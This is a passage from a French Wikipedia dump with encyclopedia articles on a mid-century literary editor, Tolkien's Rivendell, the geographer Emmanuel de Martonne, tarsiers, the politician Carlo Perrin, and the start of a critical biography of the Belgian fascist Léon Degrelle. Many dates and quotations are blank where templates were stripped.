Il écrivit un certain nombre d’ouvrages, des essais : "Les Matinées du hêtre rouge", "L’Adhésion", "Images bibliques", "Orphée", et des romans autobiographiques : "Samson fils de Samson" et "Ce vagabond".
Seconde Guerre mondiale.
Les "Nouvelles Littéraires" se sabordent en juin 1940. Il passé l'été 1940 dans les Alpes-Maritimes, et arrive à Vichy en novembre 1940, comme d'autres écrivains. Pendant la Seconde Guerre mondiale, il rédige des articles dans "Le Jour" de 1940 à 1942, où il prend position pour le maréchal Pétain et à sa politique de « retour à la terre », ainsi qu'à Pierre Dominique.
Il se retire ensuite dans un village auvergnat au Vernet-la-Varenne, où il vécut pendant les années de guerre (1942-1944). Il y écrivit un livre intitulé "Rêveries des Claustres" dédié à la famille Genestier, de Chaméane, qui l'avait caché à plusieurs reprises.
Après la libération, il reprit son activité en octobre 1944 aux "Nouvelles Littéraires" dont il était la directeur.
Il succomba en septembre 1949 des suites d’un accident cardiaque qui l’avait frappé au mois d'août précédent. 
Les "Lettres françaises" indiquent que "c’était un homme truculent qui aimait la vie, mais mitigé d’une certaine onction qu’il devait sans doute à son éducation religieuse". L'hebdomadaire Carrefour indique qu'il était "bourru, mais généreux et enthousiaste, il fut un découvreur. Henry Castillou est le dernier jeune qu’il dénicha. Esprit fin — il adorait les beaux livres et la conversation des jolies femmes. Esprit profond — il aimait les discussions sur ce qui demeure : Dieu, la religion, le sens de la vie.".
Une place porte son nom à Izé.

</doc>
<doc id="249069" url="https://fr.wikipedia.org/wiki?curid=249069" title="Tarsiidae">
Tarsiidae



</doc>
<doc id="249070" url="https://fr.wikipedia.org/wiki?curid=249070" title="Frédéric lefèvre">
Frédéric lefèvre



</doc>
<doc id="249074" url="https://fr.wikipedia.org/wiki?curid=249074" title="Fondcombe">
Fondcombe

Fondcombe, Fendeval ou Combe Fendue (suivant les traductions françaises, Rivendell en anglais), est une vallée fictive des Montagnes de Brume où réside un groupe d'Elfes sous l'autorité d'Elrond, dans le légendaire de .
Fondée en l'an 1697 du Second Âge comme refuge et place forte face à Sauron en Eriador à la suite de la chute de l'Eregion, durant tout le Troisième Âge, Fondcombe demeura un abri et un centre de préservation du savoir ainsi qu'un des derniers lieux de résidence des Eldar en Terre du Milieu.
Fondcombe apparaît comme une étape importante du récit tant dans "Le Hobbit" que dans "Le Seigneur des anneaux".
Dénominations.
Dans ses œuvres, Tolkien utilise l'anglais pour traduire l'occidentalien, langue commune des Humains de l'ouest des Terres du Milieu. Le terme occidentalien "Karningul" est ainsi rendu en anglais par "Rivendell", lui-même traduit en français par "Combe Fendue" (traduction de "Bilbo le Hobbit" par Francis Ledoux) ou "Fondcombe" (traduction du "Seigneur des anneaux" par Francis Ledoux), ou "Fendeval" (traduction du "Hobbit" et du "Seigneur des anneaux" par Daniel Lauzon). Le terme sindarin "Imladris" évoque de même une vallée profondément encaissée, comme fendue dans les escarpements qui l'entourent.
Par métonymie, ces termes sont également employés pour désigner la demeure d'Elrond elle-même. Celle-ci est également désignée sous le nom de "Dernière Maison Simple" ou "Dernière Maison Hospitalière" ("") en référence à son statut de dernier lieu de résidence d'Eldar en Terre du Milieu et de dernier établissement avant les Monts Brumeux et les Terres Sauvages qui s'étendent à l'est.
Géographie.
Fondcombe est située dans une gorge creusée par la Bruinen ("Sonoronne") dans les contreforts occidentaux des Monts Brumeux. Ainsi que son nom l'indique, il s'agit d'une vallée très encaissée, difficile à découvrir si l'on n'en connaît pas le chemin. Sa principale voie d'accès passe par le Gué de la Bruinen, celui où une crue soudaine emporte les Nazgûl dans " des anneaux".
Le climat de Fondcombe est tempéré, avec une influence continentale. L'été y est plus frais et les hivers plus froids et neigeux que dans les contrées plus à l'ouest, par exemple la Comté. Dans ses "Lettres", Tolkien précise que Fondcombe, comme Hobbitebourg, est située à l'équivalent du , latitude d'Oxford.
Histoire fictive.
À la fin de la guerre des Elfes et de Sauron, au du Second Âge, Elrond, menant l'armée d'Eriador en déroute, en fit un refuge dans la vallée d'Imladris. Toute personne qui fuit l'ombre de Sauron peut s'y rendre. C'est d'ailleurs là que Bilbon se rendit à deux reprises lors de sa quête à Erebor, puis à la fin de sa vie, mais aussi son neveu, Frodon, au début de la Quête de l'Anneau.
Les survivants du Désastre des Champs d'Iris y apportèrent les tronçons de Narsil où elle fut reforgée en temps voulu.
C'est à Fondcombe qu'eut lieu le Conseil Blanc qui réunit les Istari restés à l'Ouest des Terres du Milieu et les principaux seigneurs elfiques. Il y eut ensuite le Conseil d'Elrond où des représentants des Peuples Libres se sont réunis pour décider du sort de l'Anneau unique, amené jusqu'à Fondcombe par Frodon. Étaient présents, entre autres, Gandalf ; Elrond, Glorfindel et Erestor d'Imladris ; Galdor de Mithlond ; Legolas, fils du roi Thranduil des elfes de la Forêt Noire ; Frodon et Bilbon Sacquet ; les hommes Boromir du Gondor et Aragorn des Dúnedain du nord; les nains d'Erebor Glóin et son fils Gimli. Il fut décidé que l'Anneau devait être détruit à la Montagne du Destin, au cœur du Mordor, et qu'une Communauté serait formée pour accompagner Frodon, le Porteur de l'Anneau.
La Communauté de l'Anneau partit quelques semaines plus tard en direction du Mordor.
Bien que Tolkien n'ait pas établi de texte précis sur ce sujet, il semble, d'après les notes assemblées par son fils, Christopher Tolkien, que durant la Guerre de l'Anneau, Fondcombe ait subi plusieurs assauts de la part des Orques et Gobelins des Monts Brumeux, commandés par Dol Guldur et le Mordor. Il apparaît également qu'Elrond ait joué un rôle important comme coordinateur de la résistance à Sauron, dépêchant des messagers aux différents royaumes et communautés libres ; ce rôle, lié à Galadriel, est mis en évidence dans l'adaptation cinématographique de Peter Jackson.
Aragorn y est élevé durant sa jeunesse. C'est l'un des deux lieux où peut se situer sa rencontre avec Arwen Undomiel, fille d'Elrond, l'autre possibilité étant la Lothlórien (Tolkien est contradictoire dans ses récits sur ce point).
Histoire ultérieure.
Bien qu’Elrond ait quitté Fondcombe, Elladan et Elrohir restèrent pendant un certain temps avec certains des Noldor restants. On pense que Celeborn a déménagé à Fondcombe après le départ de Galadriel et s’est également lassé de l’Est de la Lórien.
On ne sait pas quand Fondcombe fut finalement abandonnée, mais peu de temps avant la mort d’Aragorn pendant le Q.A.. En 120, il dit à Arwen que « personne ne se promène maintenant » dans le jardin d’Elrond, indiquant que les derniers Noldor étaient partis pour Valinor.
Conception et évolution.
Une inspiration possible (ainsi suggérée par David Salo) aurait pu être Lauterbrunnen, en Suisse, que Tolkien a visité en 1911 :Je suis... Je suis enchanté que vous ayez fait la connaissance de la Suisse, et de la partie même que j’ai connue autrefois le mieux et qui a eu le plus d’effet sur moi. Le voyage du hobbit de Fondcombe à l’autre côté des Monts Brumeux, y compris la glissade le long des pierres rampantes dans les bois de pins, est basé sur mes aventures en 1911 (il avait 19 ans et s’est rendu à Lauterbrunnen)... Nos pérégrinations, principalement à pied dans un groupe de 12 personnes, ne sont pas maintenant claires dans l’ordre, mais laissent beaucoup d’images vivantes aussi claires qu’hier. (Il parle de conditions similaires pour le voyage de Bilbo, campant, marchant sur les sentiers de montagne, portant des sacs).
— Lettre 306
Critique et analyse.
La vallée de Fondcombe a été comparée du Val sans Retour de la légende arthurienne : pour Claire Jardillier, .
Adaptations.
Dans le premier film de la trilogie cinématographique de Peter Jackson, "", Fondcombe est filmée dans le parc régional de Kaitoke, à Upper Hutt en Nouvelle-Zélande.
Dans l'adaptation en trois volets du "Hobbit", également réalisée par Peter Jackson, Fondcombe est désormais filmée en studio ; le décor est complété par des extensions numériques en post-production.

</doc>
<doc id="249075" url="https://fr.wikipedia.org/wiki?curid=249075" title="Emmanuel de Martonne">
Emmanuel de Martonne

Emmanuel de Martonne, né à Chabris (Indre) le et mort à Sceaux le , est un géographe français.
Jeunesse.
Fils de l'archiviste Alfred de Martonne et frère d'Édouard de Martonne, il étudie au lycée de Laval (Mayenne), où il a comme condisciples Carle Bahon et Francis Delaisi. Il entre à l'École normale supérieure à Paris en 1892, la même année qu'Albert Demangeon ; il y suit les cours de géographie de Paul Vidal de La Blache (dont il deviendra le gendre). Agrégé de géographie en 1895, il est « maître-surveillant » à l'École normale supérieure en 1897-1899.
En 1902, il soutient ses deux thèses de doctorat ès lettres. La première, en français, consiste en un essai de monographie géographique sur la région roumaine de Valachie. La deuxième, en latin, traite de l’importance des cartes géographiques pour représenter le mode de répartition des populations.
En 1912, il participe avec Albert Demangeon, Antoine Vacher et Emmanuel de Margerie à une excursion transcontinentale à travers les États-Unis, organisée par l"American Geographical Society" et le géomorphologue de Harvard William Morris Davis ; il y rencontre notamment les jeunes géographes américains Isaiah Bowman et Douglas W. Johnson.
Géographe, climatologue et traceur de frontières.
Nommé à l'université de Rennes en 1899, puis à celle de Lyon en 1905, il obtient un poste à la Sorbonne en 1909. La même année, il fait paraître un "Traité de géographie physique" qui connaît un grand succès (nombreuses rééditions, rédaction d'un "Abrégé" également réédité) et consacre son autorité en géographie physique. Féru de géomorphologie et de climatologie, il est célèbre pour ses indices d'évapotranspiration potentielle, utilisés aujourd'hui par les botanistes et les agronomes. Il invente le concept de « diagonale aride » regroupant les différents milieux secs échelonnés en latitude et en longitude et dont les mécanismes responsables des degrés d'aridité se combinent (on lui préfère aujourd'hui le concept de « diagonale sèche »). Il est enfin l'auteur du volume sur la géographie physique de la France dans la "Géographie universelle" (1942).
Il s'intéresse toujours à l'Europe centrale et, à ce titre, il participe aux travaux de la conférence de la Paix, en 1919, participant aux travaux de quatre commissions (commission des affaires roumaines et yougoslaves ainsi que sa sous-commission, commission des affaires polonaises ainsi que sa sous-commission, commissions réunies des affaires tchécoslovaques et des affaires polonaises, comité central des questions territoriales). En plus de travailler à partir de 1915 pour le Service géographique de l'Armée sous la direction du général Robert Bourgeois avec Albert Demangeon et Antoine Vacher, il fut le Secrétaire du Comité d'études fondé par Aristide Briand en 1917.
Durant les travaux, il insiste pour que les frontières tiennent compte non seulement des regroupements ethniques (selon le principe du droit des peuples à disposer d'eux-mêmes), mais également, d'un point de vue plus pratique, des infrastructures du territoire : c'est ce qu'il nomme le « principe de viabilité ». C'est ainsi qu'à l'encontre des délégués américains (en particulier Bowman et Johnson) et italiens, Martonne obtient que les frontières de la Hongrie avec la Roumanie et avec la Tchécoslovaquie longent et englobent côté roumain et tchécoslovaque des lignes de chemin de fer reliant ces deux pays entre eux et le Royaume des Serbes, Croates et Slovènes, malgré la présence de « poches » à majorité hongroise sur le tracé (notamment les villes d'Arad, Nagyvárad, Szatmárnémeti et Kassa). Ce choix est dicté par un axe géopolitique de la stratégie française de l'époque : renforcer la « Petite Entente » alliée à la France.
Emmanuel de Martonne contribue ainsi de manière décisive au dessin des frontières de l'entre-deux-guerres, dont la plupart sont toujours en place. Il est l'auteur des deux volumes de la "Géographie universelle" consacrés à l'Europe centrale (1930 et 1931).
Transmetteur, fondateur et organisateur.
En Roumanie, Emmanuel de Martonne rencontre le naturaliste Grigore Antipa qui lui fait découvrir la géonomie, discipline à la croisée de la géographie et des sciences naturelles, que lui et son condisciple Albert Demangeon introduisent alors en France. Grand organisateur de la géographie à l'échelle nationale et internationale, Emmanuel de Martonne fonde le laboratoire de géographie de l'Université de Rennes (qui a perduré jusqu'à nos jours, passant entre les mains d'André Meynier, baptisé aujourd'hui « COSTEL » : "Climat et Occupation des Sols par Télédétection"), puis ceux de Lyon et de Paris (1923) ; il devient directeur de ce dernier (1927-1944). Dans les années 1930, il dirige la publication de l"Atlas de France". En 1943, il obtient la création d'une licence et d'une agrégation de géographie. Secrétaire général puis président de l"Union géographique internationale" (1931-1949), il est élu membre de l'Académie des sciences en 1940 ; il préside la Société de géographie de 1947 à 1952.
Hommages.
Le principal amphithéâtre de l'Institut de Géographie, bâtiment de l'Université Paris 1 Panthéon Sorbonne, porte son nom, de même que 
l'amphithéâtre B6 de l'Université Rennes 2 sur le Campus de Villejean.
Un collège porte son nom à Laval.
Les villes roumaines de Cluj et Timişoara ont des rues à son nom.
Trois bustes se trouvent, l'un sur la Calea Victoriei à Bucarest, l'autre dans le parc du 1er décembre à Oradea, le dernier devant la citadelle d Alba Iulia.

</doc>
<doc id="249077" url="https://fr.wikipedia.org/wiki?curid=249077" title="Tarsier">
Tarsier

Les tarsiers (Tarsiidae) forment une famille de primates haplorhiniens vivant en Asie du Sud-Est, caractérisés par leurs yeux énormes et leurs pieds très développés.
Ils constituent les uniques représentants actuels de l'infra-ordre des tarsiens (Tarsiformes). Les tarsiers ont longtemps été regroupés dans le seul genre "Tarsius". Depuis les années 2010, plusieurs découvertes ont poussé les spécialistes à reconsidérer cet ensemble et certains auteurs ont proposé de le diviser en trois genres : "Tarsius", "Carlito" et "Cephalopachus".
Longtemps classés parmi les prosimiens, les tarsiers partagent pourtant plusieurs caractéristiques avec les singes.
Taxonomie.
Les "tarsiidés" (Tarsiidae) forment la seule famille dans l'infra-ordre des Tarsiiformes. L'infra-ordre entier était auparavant classé dans le sous-ordre des strepsirrhiniens, mais il est maintenant classé dans celui des haplorrhiniens, bien qu'ils ne soient pas considérés comme des singes (Simiiformes).
Certaines hypothèses font des omomyidés, une famille de formes fossiles, les ancêtres des tarsiers actuels. Ce sont les plus vieux primates au monde car ils sont apparus il y a d'années.
Caractéristiques.
Le tarsier est une créature difficile à apercevoir. Il ne quitte presque jamais l'arbre qu'il a choisi comme logement et se déplace uniquement pour se nourrir.
Doté d'oreilles capables de s'orienter dans toutes les directions et d'une queue semblable à celle des rats, ce minuscule primate de (sans compter la queue) et de 120 g possède de gros yeux globuleux et de très longs pieds, d'où leur nom que l'on doit à Georges-Louis Leclerc de Buffon : les os du tarse étant très développés chez eux.
Mammifères nocturnes, discrets et farouches, ils sont essentiellement insectivores et capturent leur proie (criquets, sauterelles, fourmis, blattes ...) en bondissant dessus, d'une branche à l'autre. Il leur arrive de chasser des oiseaux ou leurs œufs, des petits amphibiens, des chauves-souris et des serpents.
La gestation dure environ six mois et aboutit à la naissance d'un seul petit.
Les tarsiers ont la plus longue suite continue de fossiles parmi les primates, attestant que leur formule dentaire n'a pas changé depuis d'années. Contrairement à beaucoup d'animaux nocturnes, les tarsiers n'ont pas de "tapetum" ("tapetum lucidum", une couche réfléchissante qui est située soit à l'arrière de la rétine, soit à l'intérieur de la rétine.). Leur fovea est également atypique pour des animaux nocturnes, c'est ce qui en fait une espèce nyctalope. Le tarsier peut faire pivoter sa tête à dans les deux sens ; c'est indispensable car ses yeux sont trop gros pour tourner dans les orbites. J. Pettigrew met en évidence les 6 muscles oculomoteurs nains, mais parfaitement fonctionnels. Il en déduit que comme pour les chouettes, les yeux des tarsiers sont capables d'avoir un ajustement de position lent et fin en cas de luminosité très faible.
Les yeux du tarsier brillent dans la nuit, ce qui a amené les indigènes de Bornéo à le considérer comme un « "hantou" » (démon). Il est craint et vénéré par les peuples d'Indonésie.
Le tarsier est aussi le seul primate connu à émettre et percevoir les ultrasons. Cette aptitude lui permet de communiquer à l'insu de ses prédateurs, mais aussi de ses proies.
Stress.
Très anxieux, les tarsiers sont stressés par la voix humaine, l'approche d’une main ou le flash d'un appareil photo. Cela peut suffire à les plonger dans la détresse et jusqu'à mettre fin à leurs jours : « Ils s'arrêtent de respirer et meurent à petit feu. Si vous les mettez dans une cage, ils veulent sortir, alors ils se cognent la tête contre la cage, et elle craque tant leur crâne est fin », explique Carlito Pizarras, conservateur au sanctuaire pour tarsiers de Corella, sur l'île de Bohol.

</doc>
<doc id="249079" url="https://fr.wikipedia.org/wiki?curid=249079" title="Carlo Perrin">
Carlo Perrin

Carlo Silvio Perrin, également Charles Perrin, né le à Torgnon, est un homme politique italien, de la junte régionale de la Vallée d'Aoste depuis le ( du Conseil de la Vallée) jusqu'en 2005.
Biographie.
Il a été sénateur au Sénat de la République d'avril 2006 à avril 2008, élu sur une liste Autonomie Liberté Démocratie (et inscrit au groupe sénatorial Pour les autonomies), alliée à l'Union (centre-gauche). Il est battu d'assez peu en 2008, par Antoine Fosson, sur une liste du Renouveau valdôtain.
Ancien membre de l'Union valdôtaine (UV), un parti régionaliste, allié à l'Olivier (centre-gauche), il a lancé depuis le mouvement Renouveau valdôtain.
Ayant effectué l'École normale, il a enseigné comme professeur des écoles et bibliothécaire.
Il a également été syndic de Torgnon de 1975 à 1985, puis de 1990 à mai 1993.
Il figure parmi les fondateurs de l'Association régionale des éleveurs valdôtains (AREV), dont il a été le président de 1984 à 1993.
En 1993, il est élu conseiller régional, réélu en 1998, puis en 2003 (XII législature du Conseil régional) avec 4.139 voix.
Il a obtenu 25 voix, 3 de plus que la majorité (ont voté pour lui 3 des 7 conseillers de Stella alpina). La Maison des libertés et Arcobaleno Vallée d'Aoste ont annoncé qu'ils n'avaient pas voté pour lui. Il peut compter sur 22 voix (18 d'UV et 4 des Démocrates de gauche).
Il a déclaré lors de son élection : « "Il existe une éthique fondée sur le respect des différences, sur le respect de la personne, sur le respect réciproque entre les différentes formations politiques au sein de cette assemblée, et en dehors, dans les rapports avec le gouvernement de Rome, dans les rapports avec les autres institutions." »

</doc>
<doc id="249080" url="https://fr.wikipedia.org/wiki?curid=249080" title="Léon Degrelle">
Léon Degrelle

Léon Degrelle, né le à Bouillon (Belgique) et mort le à Malaga (Espagne), est un journaliste, écrivain, et directeur de presse engagé dans la mouvance catholique belge. Il entama ensuite une carrière politique, en fondant le mouvement Rex, au départ parti nationaliste proche des milieux catholiques, qui devint rapidement un parti fasciste, puis durant la Seconde Guerre mondiale, se rapprocha du national-socialisme, pour finir dans la collaboration avec l'occupant allemand. 
Combattant sur le front de l'Est avec la division SS "", il termina la guerre en tant que et . Exilé en Espagne en 1945 et naturalisé en 1954, il y vécut pendant près de cinquante ans, construisant sa propre légende et s'érigeant en ardent défenseur du nazisme et des thèses négationnistes. Il s'imposa comme une référence de l'extrême droite.
Enfance et jeunesse.
Léon Joseph Marie Ignace Degrelle est né à Bouillon, dans l'Ardenne belge, le . Son père, Édouard Degrelle, brasseur en France, s'était expatrié en Belgique en 1901 en réaction à l'expulsion des Jésuites de France et au « sectarisme anticlérical », selon Robert Brasillach. L'historien Alain Colignon envisage une hypothèse où Édouard Degrelle aurait quitté par intérêt la France pour la Belgique où il a repris une brasserie florissante. Son épouse, Marie-Louise Boever est la fille du chef de file de la droite luxembourgeoise. Après sa naturalisation, Édouard Degrelle se lance en politique au sein du Parti catholique ; élu au conseil provincial du Luxembourg, il en devient député permanent en 1925. Léon est le cinquième enfant du couple, après les naissances de Marie, Édouard (mort à vingt mois), Jeanne, Madeleine et avant celles de Louise-Marie, d'Édouard et de Suzanne. La famille est marquée par un catholicisme fervent : prière du soir, messe et communion quotidiennes, présence à quatre offices le dimanche.&lt;br&gt;
Léon va à l'école maternelle avec sa sœur Louise-Marie, sa cadette de treize mois, chez les Religieuses de la doctrine chrétienne.
Après avoir entamé ses études secondaires à l'institut Saint-Pierre de Bouillon, en section gréco-latine, Léon Degrelle entre, en 1921, au Collège Notre-Dame-de-la-Paix à Namur tenu par les Jésuites : . Passionné par la littérature et notamment par Charles Péguy, il se met à écrire des poèmes et collabore à des journaux et revues de la province à l'âge de quinze ans. À cet âge, il est décrit comme . À dix-sept ans, il entretient une correspondance suivie avec le cardinal Mercier, primat des Belges, et est également remarqué par le dirigeant socialiste Émile Vandervelde qui publie l'un de ses articles dans "Le Peuple" et lui manifeste sa sympathie.
Pendant sa scolarité au collège, il découvre la pensée de Charles Maurras, dont il devient un fervent partisan et . En raison de sa proximité avec l'Action française, Degrelle conçoit également une profonde admiration pour l'œuvre de Léon Daudet, et . En 1924, à dix-huit ans, Degrelle entame des études de droit à la faculté catholique de Namur : c'est durant cette première année universitaire qu'il organise une vigoureuse campagne de soutien à Maurras, en réponse à un sondage lancé par les cahiers de la jeunesse catholique sur la question : La campagne est particulièrement efficace et Maurras arrive largement en tête des votes. Degrelle rate ses examens et entame ensuite des études de lettres et de philosophie thomiste à l'Université catholique de Louvain ; après deux années brillantes, il s'inscrit en droit et sciences politiques, . L'un de ses professeurs, le vicomte Charles Terlinden, estime qu'il s'agit d'un étudiant médiocre dont .
Écrivain et journaliste.
En octobre 1927, avant la fin de ses études, et à l'initiative de Louis Picard, l'aumônier général de l'Action catholique de la jeunesse belge (ACJB), Degrelle prend la direction de "L'Avant-Garde", le journal des étudiants de l'université de Louvain : son activité à la tête de ce périodique . En janvier 1928, il participe au saccage d'une exposition de l'Union des républiques socialistes soviétiques organisée à Bruxelles, en déclarant, à propos des communistes : 
De 1928 à 1930, Degrelle écrit à la fois des poèmes ("Les Tristesses d'hier", recueil paru en 1930), des ouvrages parodiques comme "Jeunes plumes et vieilles barbes de Belgique" (1928) puis "Les grandes farces de Louvain", des livres politiques et polémiques ("Les Flamingants" en 1928, où il prône « la nécessité d'une meilleure compréhension entre les deux communautés nationales ») et "Furor teutonico" où il soutient les autorités catholiques contre les milieux anticléricaux. En 1929, l'abbé Norbert Wallez l'engage comme rédacteur au "Vingtième Siècle", où débute également Hergé. Sa série d'articles sur les taudis, particulièrement peu tendres pour les propriétaires, lui vaut une lettre de félicitations du premier ministre Henri Jaspar ; lorsqu'ils sont publiés dans un recueil, celui-ci est préfacé par le ministre du Travail.
Après l'assassinat du président du Mexique Álvaro Obregón, par José de León Toral, un jeune étudiant catholique opposé à la politique anticléricale du gouvernement, Degrelle publie un article dans le "Vingtième Siècle" approuvant le meurtre d'Obregón et se clôturant par , article qui déclenche un vaste scandale. Mis au défi par la presse de gauche de se rendre au Mexique pour aller voir de lui-même ce qui s'y passe, Degrelle s'y rend dans des circonstances rocambolesques, qu'il amplifie et romance dans son ouvrage "Mes aventures au Mexique". Après un séjour au milieu des Cristeros, et grâce au produit de la vente de ses articles à un éditeur américain, il visite ensuite rapidement les États-Unis, d'où il envoie des bandes dessinées à Hergé, et le Canada, avant de rentrer en Belgique en . Il publie, cette même année, une brochure de 37 pages intitulée "Histoire de la guerre scolaire. 1879-1884", plaquette .
Degrelle, Rex et le rexisme.
Une maison d'édition catholique.
En , Degrelle est nommé directeur de la modeste maison d'édition "Christus-Rex", spécialisée dans la publication des brochures de l'Action catholique, appelé à ce poste par Louis Picard. . . Il se lance dans la publication de brochures d'actualité vendues un franc et dans celles de plaquettes pour chaque événement pouvant intéresser de nombreux catholiques ; il participe au lancement, le de l'hebdomadaire "Soirées" qui connaît un certain succès et dont les éditions Rex prennent le contrôle en . Lors des élections législatives de 1932, Degrelle est chargé d'une partie de la campagne électorale du parti catholique lors de laquelle il montre ses réels talents de propagandiste, en diffusant d'après ses dires, et , « vrais chefs-d'œuvre de psychologie simple, de goût et d'art ». Au cours de cette campagne, Degrelle utilise également une affiche réalisée par Hergé, sur laquelle figure une tête de mort protégée par un masque à gaz, avec le slogan « Contre l'invasion, votez pour les catholiques », et en lieu et place de la signature d'Hergé, la mention « le studio des éditions de Rex » ; l'utilisation de cette affiche suscite l'opposition d'Hergé, pour des raisons qui ne sont pas politiques mais purement artistiques. Le créateur de Tintin est . 
Léon Degrelle a déclaré dans ses mémoires posthumes, publiées en 2000, six ans après sa mort et considérées comme « mégalomanes », qu’il était le meilleur ami d’Hergé, information catégoriquement démentie par les historiens, mais il ne faisait pas partie du groupe d’amis d’Hergé et n’a pas été invité à son mariage en 1932, même s’ils ont pu être tous deux invités à diner chez l’abbé Wallez, le directeur de leur journal en 1928.
De 1932 à 1933, Degrelle lance successivement quatre nouvelles publications, "Rex", "Vlan", "Foyer" et "Crois". À ses débuts, "Rex" est conçu comme un supplément littéraire de 16 pages à "Soirées", l'aspect politique étant confié à "Vlan". En annonçant dans "Rex" le premier numéro de "Vlan", Degrelle ne cache pas ses objectifs : . Les résultats de l'enquête sur le Parti catholique publiés dans le "Vlan" du confirment que la critique prend le pas sur les encouragements : dans le numéro de "Rex" du , Degrelle avait déjà été très clair :
Le , Degrelle devient propriétaire des éditions Rex grâce à des interventions financières familiales, et à la souscription par les pères norbertins de l'abbaye d'Averbode de six cents parts de la nouvelle société. Cette prise de contrôle se traduit à nouveau par une débauche d'activités et de nouvelles publications : lancement d'une collection de romans à la portée de tous, édition de livres d'hommes politiques catholiques, de brochures tirées à plusieurs dizaines de milliers d'exemplaires sur les apparitions de la Vierge à Beauraing et à Banneux.
Rupture et ascension.
L'action de Degrelle prend une tournure de plus en plus politique à partir de 1934 : sa volonté d'organiser le un congrès de presse des jeunes catholiques, dont le véritable but est de lui fournir une publicité personnelle, suscite une réaction de l'évêque de Tournai, Gaston-Antoine Rasneur qui lui fait savoir qu'il trouve cette initiative inopportune. Degrelle tourne ce discret désaveu à son avantage en publiant dans "Rex" et "Soirées", le , un article intitulé "Au service de l'Église" dans lequel il écrit notamment qu' Cet article vaut à Degrelle une lettre de remerciements de l'évêque de Liège, Louis-Joseph Kerkhofs.
Cet acte de soumission ne rassure les autorités catholiques qu'un temps. À la suite de l'activisme de Degrelle, Louis Picard, l'aumônier général de l'Association catholique de la jeunesse belge, fait part au cardinal Joseph-Ernest Van Roey de ses inquiétudes : . Bien qu'il ait été convoqué à l'archevêché de Malines pour dissiper la confusion entre Rex et l'Action catholique, Degrelle poursuit ses meetings politiques. Le , c'est le pas de trop. Lors du congrès annuel de la fédération des associations et cercles catholiques, à Courtrai, il fait bloquer les issues par trois cents jeunes rexistes et se livre à une violente diatribe contre le parti catholique allant jusqu'à traiter le sénateur Philips, ou le ministre d'État Paul Segers « d'excrément vivant ». Le « Coup de Courtrai » est suivi par un décret épiscopal du cardinal Van Roey, le , ce qui vaut au cardinal d'être traité par Degrelle de « Rhinocéros de Malines » et de « cardinal Van Grenouille ». Le « coup de Courtrai » et le blâme épiscopal qui en résulte, marquent la fin d'une période du rexisme.
Dans la perspective des élections législatives du , sous la plume de Degrelle, le ton de "Rex", se fait de plus en plus virulent et divers hommes politiques catholiques, auparavant soutenus par "Rex", se font traiter ; même un évêque, comme Joseph Schyrgens, est décrit comme . Après le blâme épiscopal, ces tirades amènent à une rupture définitive avec le parti catholique qui annonce, le , la fin des contacts avec Degrelle et interdit à ses membres de collaborer au mouvement rexiste. L'entrée en politique de Rex de manière indépendante entraîne une profonde transformation du mouvement : si la plupart de ses cadres sont encore de jeunes catholiques militants, Rex devient .
Dans son journal, "Le Pays réel", fondé le , Degrelle mène une virulente campagne contre les scandales de corruption dans lesquels des politiciens de tous bords étaient, selon lui, impliqués, se présentant comme « le grand épurateur » du puissant parti catholique dont il ambitionne de prendre la tête ; . Les scandales dénoncés par Degrelle sont parfois imaginaires et, . Il n'empêche, la campagne orchestrée par Degrelle frappe l'opinion : des rexistes porteurs de balais défilent dans les rues aux alentours des permanences catholiques, le terme de « bankster » connaît un grand succès et la violence du ton de Degrelle ne connaît plus de limites : à propos de Paul Segers, il écrit : . Degrelle fonde également sa campagne sur l'antiparlementarisme et le rejet des partis traditionnels. Le mouvement rexiste fonde sa campagne sur les scandales politico-financiers et sur la nécessité d'assainir l'atmosphère politique. « Parant au plus pressé, Léon Degrelle et ses lieutenants s'approprient alors certains éléments du programme fasciste et national-socialiste. Pas de véritable programme donc, mais une prodigieuse improvisation s'adaptant d'une manière adéquate aux difficultés rencontrées, n'arrêtant pas de se créer elle-même et témoignant par son efficacité même, d'une remarquable vitalité » :
. Avec lors des élections du , le parti rexiste obtient 11,5 % des voix, 21 députés et douze sénateurs. « Qu'un mouvement politique inexistant en 1935, soit parvenu à rallier plus de 11 % des suffrages après une campagne de six mois, voilà qui bouleverse les données traditionnelles et les habitudes électorales belges ». Rex obtient même plus de 15 % des voix dans les provinces de Liège, du Luxembourg, de Namur et en région bruxelloise dépassant les 20 % dans le canton électoral d'Ixelles et à Saint-Josse-ten-Noode. Comme les autres dirigeants des partis politiques belges, Degrelle est reçu par le roi Léopold III, pendant près d'une heure et demie, le . Durant cette entrevue, « le chef de l'État a droit à un meeting privé. Un torrent de paroles, une trombe de mots s'abat sur lui. Il découvre un phénomène : un jeune débordant de vitalité et d'allégresse, agitateur, hâbleur, bluffeur ». À l'issue de cet entretien, au cours duquel Degrelle a réclamé le ministère de la Justice avec des pouvoirs étendus et qui ne débouche sur rien, le roi déclare à l'un de ses conseillers que Degrelle s'est révélé comme un être . Degrelle, qui ne s'est pas présenté aux élections est et reste le chef incontesté du parti rexiste dont il nomme les principaux dirigeants sans aucun processus démocratique interne. Il n'entend en aucune manière partager son autorité.
Degrelle n'a toujours pas de réel programme politique et ses positions varient. Si, après le départ en grève de anversois, il réclame des sanctions contre le bourgmestre d'Anvers « complice des émeutiers », dans "Le Pays réel" du , dix jours après, il apporte son soutien aux grévistes : 
Degrelle recherche le soutien de l'Allemagne nazie et de l'Italie fasciste. D'après Maurice De Wilde, il s'est déjà rendu en Allemagne avec deux de ses collaborateurs (Guido Eeckels et Jean Denis), du au , les billets de train et visas étant gratuitement fournis par l'ambassade allemande à Bruxelles. . Jusqu'en 1936, Degrelle ne semble pas avoir entretenu d'autres relations avec l'Allemagne ce qui semble contradictoire avec les articles de la presse rexiste en 1933 et 1934, dont le numéro de "Soirées" du , consacré à « la terreur hitlérienne, reportage hallucinant ». Fort de sa victoire électorale, Degrelle réussit à se faire inviter en Italie. Le , il rencontre à Rome Mussolini et son ministre des affaires étrangères, Ciano, qui lui accorde une aide financière substantielle. Le , il est reçu à Berlin par Adolf Hitler et Joachim von Ribbentrop ; une fois encore, cette entrevue est suivie d'une aide financière. Degrelle admire sans conteste Hitler et « l'anticommunisme, l'anticapitalisme, l'antiparlementarisme, le corporatisme sont autant de points communs [entre rexisme et nazisme] ». "Rex" et "Le Pays réel" condamnent cependant fortement la politique religieuse de l'Allemagne nazie et son esprit antichrétien. Degrelle dénonce également le mécanisme de l'apparente unanimité populaire qui rassemble les Allemands autour d'Hitler et s'inquiète de la politique de réarmement menée par celui-ci.
L'accord entre Rex et le VNV.
